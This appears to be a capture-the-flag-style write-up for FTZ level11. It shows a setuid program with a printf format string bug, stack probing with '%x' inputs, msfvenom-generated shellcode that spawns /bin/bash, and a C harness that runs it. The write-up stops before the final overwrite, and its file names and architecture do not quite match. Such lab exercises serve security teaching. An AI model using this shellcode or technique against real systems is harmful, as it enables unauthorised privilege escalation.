# Level11

## This level's goal

- FSB(Format String Bug)
- Shell code

***

```
[level11@ftz level11]$ ls -l
total 28
-rwsr-x---    1 level12  level11     13733 Mar  8  2003 attackme
-rw-r-----    1 root     level11       168 Mar  8  2003 hint
drwxr-xr-x    2 root     level11      4096 Feb 24  2002 public_html
drwxrwxr-x    2 root     level11      4096 Jan 14  2009 tmp

[level11@ftz level11]$ cat hint

#include <stdio.h>
#include <stdlib.h>

int main( int argc, char *argv[] )
{
        char str[256];

        setreuid( 3092, 3092 );
        strcpy( str, argv[1] );
        printf( str );
}
```

The hint seems the vulnerability of FSB and BOF   
I will exploit with FSB

```
[level11@ftz level11]$ ./attackme
Segmentation fault
```

This seems that Segmentation falut will be printed if there is no argument and then the argv[1] is the value of garbage.

```
[level11@ftz level11]$ ./attackme "AAAA"
AAAA
[level11@ftz level11]$ ./attackme "AAAA %x"
AAAA bffffc40
[level11@ftz level11]$ ./attackme "AAAA %x %x"
AAAA bffffc3d bffff300
[level11@ftz level11]$ ./attackme "AAAA %x %x %x"
AAAA bffffc3a bfffdb80 1
[level11@ftz level11]$ ./attackme "AAAA %x %x %x %x"
AAAA bffffc37 bfffde00 1 41414141
```

AAAA means 41414141

```
┌──(root💀kali)-[/test]
└─# msfvenom -p linux/x64/exec CMD=/bin/bash -f c -o bashcode.c
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 46 bytes
Final size of c file: 220 bytes
Saved as: shellcode.c

┌──(root💀kali)-[/test]
└─# cat bashcode.c 
unsigned char buf[] = 
"\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50\x54\x5f\x52"
"\x66\x68\x2d\x63\x54\x5e\x52\xe8\x0a\x00\x00\x00\x2f\x62\x69"
"\x6e\x2f\x62\x61\x73\x68\x00\x56\x57\x54\x5e\x6a\x3b\x58\x0f"
"\x05";

[level11@ftz tmp]$ cat shellex.c
#include <stdio.h>

char shellcode[] ="\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50\x54\x5f\x52"
"\x66\x68\x2d\x63\x54\x5e\x52\xe8\x0a\x00\x00\x00\x2f\x62\x69"
"\x6e\x2f\x62\x61\x73\x68\x00\x56\x57\x54\x5e\x6a\x3b\x58\x0f"
"\x05";

int main()
{
        (*(void (*)()) shellcode)();
}

```

